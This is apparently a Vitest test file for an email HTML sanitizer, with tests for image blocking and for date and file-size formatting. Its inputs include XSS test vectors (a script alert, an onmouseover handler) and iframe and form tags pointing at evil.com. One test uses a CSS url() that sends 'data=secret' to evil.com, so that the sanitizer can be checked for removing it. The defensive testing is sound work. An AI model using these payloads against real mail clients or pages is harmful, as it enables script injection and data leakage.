import { describe, expect, it } from "vitest";
import {
	formatFileSize,
	formatFullDate,
	hasRemoteImages,
	sanitizeEmailHtml,
} from "../email-sanitizer";

describe("sanitizeEmailHtml", () => {
	it("strips script tags", () => {
		const result = sanitizeEmailHtml('<p>Hello</p><script>alert("xss")</script>');
		expect(result).not.toContain("<script");
		expect(result).not.toContain("alert");
	});

	it("strips event handler attributes", () => {
		const result = sanitizeEmailHtml('<p onmouseover="alert(1)">Hello</p>');
		expect(result).not.toContain("onmouseover");
		expect(result).not.toContain("alert");
	});

	it("strips iframe tags", () => {
		const result = sanitizeEmailHtml('<iframe src="https://evil.com"></iframe>');
		expect(result).not.toContain("<iframe");
	});

	it("strips form tags", () => {
		const result = sanitizeEmailHtml('<form action="https://evil.com"><input type="text"></form>');
		expect(result).not.toContain("<form");
	});

	it("neutralizes CSS url() references to prevent data exfiltration", () => {
		const result = sanitizeEmailHtml(
			"<div style=\"background-image: url('https://evil.com/track?data=secret')\">Hi</div>",
		);
		expect(result).not.toContain("evil.com");
		expect(result).toContain("url()");
	});

	it("neutralizes multiple CSS url() references in one style", () => {
		const result = sanitizeEmailHtml(
			'<td style="background: url(https://a.com/1); list-style-image: url(https://b.com/2)">X</td>',
		);
		expect(result).not.toContain("a.com");
		expect(result).not.toContain("b.com");
	});

	it("preserves safe inline styles without url()", () => {
		const result = sanitizeEmailHtml('<div style="color: red; font-size: 14px">Hello</div>');
		expect(result).toContain("color: red");
		expect(result).toContain("font-size: 14px");
	});

	it("forces links to open in new tab", () => {
		const result = sanitizeEmailHtml('<a href="https://example.com">Click</a>');
		expect(result).toContain('target="_blank"');
		expect(result).toContain('rel="noopener noreferrer"');
	});

	it("removes 1x1 tracking pixels", () => {
		const result = sanitizeEmailHtml(
			'<img src="https://tracker.com/pixel.gif" width="1" height="1">',
		);
		expect(result).not.toContain("tracker.com");
	});

	it("removes tracking pixels with CSS inline dimensions", () => {
		const result = sanitizeEmailHtml(
			'<img src="https://tracker.com/pixel.gif" style="width:1px;height:1px">',
		);
		expect(result).not.toContain("tracker.com");
	});

	it("removes tracking pixels with 0x0 CSS dimensions", () => {
		const result = sanitizeEmailHtml(
			'<img src="https://tracker.com/pixel.gif" style="width: 0px; height: 0px">',
		);
		expect(result).not.toContain("tracker.com");
	});

	it("removes known tracking URL patterns", () => {
		for (const pattern of ["/track", "/pixel", "/open", "beacon"]) {
			const result = sanitizeEmailHtml(
				`<img src="https://example.com${pattern}/img.gif" width="100" height="100">`,
			);
			expect(result).not.toContain(pattern);
		}
	});

	it("blocks remote images by default", () => {
		const result = sanitizeEmailHtml(
			'<img src="https://example.com/photo.jpg" width="200" height="200">',
		);
		expect(result).not.toContain("example.com/photo.jpg");
	});

	it("allows remote images when blockRemoteImages is false", () => {
		const result = sanitizeEmailHtml(
			'<img src="https://example.com/photo.jpg" width="200" height="200">',
			{ blockRemoteImages: false },
		);
		expect(result).toContain("example.com/photo.jpg");
	});

	it("preserves safe HTML content", () => {
		const result = sanitizeEmailHtml("<p>Hello <b>world</b></p><ul><li>item</li></ul>");
		expect(result).toContain("<p>");
		expect(result).toContain("<b>world</b>");
		expect(result).toContain("<li>item</li>");
	});

	it("rewrites cid: URLs to API endpoint when messageId provided", () => {
		const result = sanitizeEmailHtml(
			'<img src="cid:image001@example.com" width="200" height="200">',
			{ blockRemoteImages: false, messageId: 42 },
		);
		expect(result).toContain("/api/attachments/by-cid/42/image001%40example.com");
	});

	it("preserves data: URI images regardless of blockRemoteImages", () => {
		const result = sanitizeEmailHtml(
			'<img src="data:image/png;base64,iVBOR" width="200" height="200">',
		);
		expect(result).toContain("data:image/png;base64,iVBOR");
	});

	it("strips style tags", () => {
		const result = sanitizeEmailHtml("<style>body { background: red; }</style><p>Hello</p>");
		expect(result).not.toContain("<style");
		expect(result).toContain("<p>Hello</p>");
	});
});

describe("hasRemoteImages", () => {
	it("returns false for plain text (no img tags)", () => {
		expect(hasRemoteImages("<p>Hello world</p>")).toBe(false);
	});

	it("returns true for remote http image", () => {
		expect(
			hasRemoteImages('<img src="https://example.com/photo.jpg" width="200" height="200">'),
		).toBe(true);
	});

	it("returns false for data: URI images", () => {
		expect(hasRemoteImages('<img src="data:image/png;base64,abc">')).toBe(false);
	});

	it("returns false for 1x1 tracking pixels", () => {
		expect(hasRemoteImages('<img src="https://tracker.com/px.gif" width="1" height="1">')).toBe(
			false,
		);
	});

	it("returns false for tracking URL patterns", () => {
		expect(
			hasRemoteImages('<img src="https://example.com/pixel/img.gif" width="100" height="100">'),
		).toBe(false);
		expect(
			hasRemoteImages('<img src="https://example.com/beacon.gif" width="100" height="100">'),
		).toBe(false);
	});

	it("returns false for 0x0 tracking pixels via CSS style", () => {
		expect(
			hasRemoteImages('<img src="https://tracker.com/px.gif" style="width: 0px; height: 0px">'),
		).toBe(false);
	});
});

describe("formatFullDate", () => {
	it("returns empty string for null", () => {
		expect(formatFullDate(null)).toBe("");
	});

	it("returns empty string for undefined", () => {
		expect(formatFullDate(undefined)).toBe("");
	});

	it("returns original string for invalid date", () => {
		expect(formatFullDate("not-a-date")).toBe("not-a-date");
	});

	it("formats a valid ISO date string", () => {
		const result = formatFullDate("2026-01-15T10:30:00Z");
		// Should contain the day and month at minimum (locale-dependent)
		expect(result).toContain("January");
		expect(result).toContain("15");
		expect(result).toContain("2026");
	});
});

describe("formatFileSize", () => {
	it("returns empty string for null", () => {
		expect(formatFileSize(null)).toBe("");
	});

	it("returns empty string for 0", () => {
		expect(formatFileSize(0)).toBe("");
	});

	it("formats bytes", () => {
		expect(formatFileSize(512)).toBe("512 B");
	});

	it("formats kilobytes", () => {
		expect(formatFileSize(2048)).toBe("2.0 KB");
	});

	it("formats megabytes", () => {
		expect(formatFileSize(5242880)).toBe("5.0 MB");
	});
});
